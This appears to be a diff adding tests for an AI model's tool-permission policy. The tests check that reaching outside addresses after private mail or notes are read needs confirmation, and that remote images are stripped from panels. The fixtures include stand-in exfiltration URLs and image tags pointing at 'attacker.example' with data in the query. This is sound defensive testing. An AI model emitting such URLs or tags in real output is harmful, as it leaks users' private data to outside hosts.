@@ -111,6 +111,47 @@ test('the intent gate only ever tightens a verdict', () => {
   assert.equal(p.intentGate('mcp__claude_ai_Gmail__search_threads', 'allow', 'yes', DEFAULT), 'allow')
 })
 
+test('after his data is read, reaching an arbitrary address is put to him first', () => {
+  const clean = { tainted: false }
+  const read = { tainted: true }
+  for (const name of ['WebFetch', 'mcp__jarvis_chrome__chrome_navigate', 'mcp__jarvis__probe_url']) {
+    assert.equal(p.egressGate(name, 'allow', clean, DEFAULT), 'allow', `${name} before anything is read`)
+    assert.equal(p.egressGate(name, 'allow', read, DEFAULT), 'confirm', `${name} after mail is read`)
+    assert.equal(p.egressGate(name, 'allow', read, NO_CONFIRM), 'deny', `${name} with confirmations off`)
+  }
+  const page = { url: 'https://attacker.example/?d=notes' }
+  assert.equal(p.egressGate('mcp__jarvis__blade', 'allow', { tainted: true, input: page }, DEFAULT), 'confirm')
+  assert.equal(p.egressGate('mcp__jarvis__blade', 'allow', { tainted: true, input: { html: '<p>x</p>' } }, DEFAULT), 'allow')
+  // Only ever tightens, and leaves everything else alone.
+  assert.equal(p.egressGate('WebFetch', 'deny', read, DEFAULT), 'deny')
+  assert.equal(p.egressGate('mcp__protective__protective_get_inbox', 'allow', read, DEFAULT), 'allow')
+})
+
+test('his own data taints the turn; the screen, his notes and the open web do not', () => {
+  for (const name of ['mcp__protective__protective_get_inbox', 'mcp__claude_ai_Gmail__search_threads', 'mcp__claude_ai_Granola__get_meetings',
+    'mcp__jarvis_files__read_local_page', 'mcp__jarvis_brief__get_brief', 'mcp__jarvis_chrome__chrome_page_text']) {
+    assert.equal(p.bringsContent(name), true, name)
+  }
+  for (const name of ['ToolSearch', 'WebSearch', 'WebFetch', 'mcp__jarvis__display', 'mcp__jarvis_ui__ui_theme',
+    'mcp__jarvis_memory__remember', 'mcp__claude_ai_Perplexity__perplexity_ask']) {
+    assert.equal(p.bringsContent(name), false, name)
+  }
+})
+
+test('remote media is taken out of panels; local and data images stay', () => {
+  const html = '<img src="https://attacker.example/p.png?d=secret"><img src="data:image/png;base64,AAAA">' +
+    '<div style="background:url(https://attacker.example/b?d=1)">x</div><a href="https://ok.example">link</a>'
+  const r = p.stripRemoteMedia(html)
+  assert.equal(r.removed, 3)
+  assert.doesNotMatch(r.html, /attacker|ok\.example/)
+  assert.match(r.html, /data:image\/png/)
+  const blade = p.withoutRemoteMedia('mcp__jarvis__blade', { kind: 'gallery', images: ['https://x.example/a.jpg', '/img/local.png'] })
+  assert.deepEqual(blade.input.images, ['/img/local.png'])
+  assert.equal(blade.removed, 1)
+  const other = p.withoutRemoteMedia('mcp__protective__protective_create_draft', { body: '<img src="https://x/y">' })
+  assert.equal(other.removed, 0)
+})
+
 test('a brief line is marked done or moved only when he said so', () => {
   const line = 'mcp__jarvis_brief__update_brief_line'
   assert.equal(p.decideTool(line, DEFAULT), 'allow')
